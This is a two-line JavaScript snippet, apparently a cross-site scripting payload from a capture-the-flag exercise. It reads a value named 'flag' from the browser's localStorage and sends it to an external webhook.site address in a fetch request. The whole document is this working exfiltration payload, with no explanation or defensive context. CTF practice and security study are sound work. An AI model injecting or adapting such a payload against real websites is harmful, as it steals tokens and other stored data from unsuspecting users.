var flag = window.localStorage.getItem('flag');
fetch('https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f/?data=' + encodeURIComponent(flag));
